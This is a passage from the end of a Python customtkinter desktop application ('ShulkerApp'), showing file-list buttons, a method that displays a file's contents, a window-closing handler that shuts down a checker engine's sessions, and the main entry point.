                    file_btn = ctk.CTkButton(self.files_scroll, text=f'{filename} ({filesize:,} bytes)', anchor='w', command=lambda fp=filepath, fn=filename: self.load_file_content(fp, fn), height=30, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary'], corner_radius=5)
                    file_btn.pack(fill='x', padx=5, pady=2)
                    self.file_buttons[filename] = file_btn
    def load_file_content(self, filepath, filename):
        """Load and display file content"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            self.file_content_text.delete('1.0', 'end')
            self.file_content_text.insert('1.0', content)
            logger.debug(f'Loaded file: {filename}')
        except Exception as e:
            self.file_content_text.delete('1.0', 'end')
            self.file_content_text.insert('1.0', f'Error loading file: {e}')
            logger.error(f'Error loading file {filename}: {e}')
    def on_closing(self):
        """Handle window closing"""
        logger.info('Application closing...')
        self.checking = False
        if self.checker_engine:
            try:
                self.checker_engine.session_manager.close_all()
            except:
                pass
        self.destroy()
if __name__ == '__main__':
    app = ShulkerApp()
    app.protocol('WM_DELETE_WINDOW', app.on_closing)
    app.mainloop()